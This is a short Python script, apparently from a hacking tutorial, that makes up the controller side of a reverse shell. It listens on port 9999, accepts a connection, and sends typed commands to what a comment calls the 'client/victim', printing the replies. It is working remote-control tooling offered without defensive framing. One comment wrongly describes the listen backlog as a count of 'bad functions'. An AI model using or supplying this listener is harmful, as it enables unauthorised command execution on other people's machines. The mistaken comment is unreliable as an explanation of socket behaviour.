import socket
import sys
#Creating a socket( connect two computers )
def create_socket():
    try:
        global host
        global port
        global s
        host= ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
         print("Socket creation error: " + str(msg))
# Binding socket and listening for the connection
def bind_socket():
    try:
        global host
        global port
        global s

        print ("Binding the port" + str (port) )

        s.bind((host, port))
        s.listen(5) # no of bad function it is going to tolerate

    except socket.error as msg:
        print ("Socket binding error " + str (msg) + "\n" + "Retrying...")
        bind_socket()


# establish the connection with the client and the socket must be listening

def socket_accept():
    conn,address = s.accept()
    print("Connnection has been established! " + "IP" + address[0])
    send_commands(conn)
    conn.close()

#send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))> 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
